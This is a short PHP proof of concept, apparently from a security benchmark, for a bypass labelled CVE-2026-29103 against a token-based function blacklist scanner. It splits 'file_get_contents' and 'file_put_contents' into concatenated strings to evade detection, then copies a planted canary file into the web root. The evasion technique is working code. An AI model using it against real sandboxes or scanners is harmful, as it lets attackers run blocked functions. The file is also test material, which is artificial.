<?php
// CVE-2026-29103 bypass: string concatenation evades v7.15.0 token-based scanner.
// Neither 'file_get' nor '_contents' individually matches the blacklist.
// ('file_get'.'_contents')(...) never has $checkFunction=true before the call '('.
// Benign benchmark canary: reads a planted marker, writes to web-accessible file.

$c = ('file_get' . '_contents')('/tmp/pcb_canary.txt');
('file_put' . '_contents')('/var/www/html/pcb_marker_bypass.txt', $c);
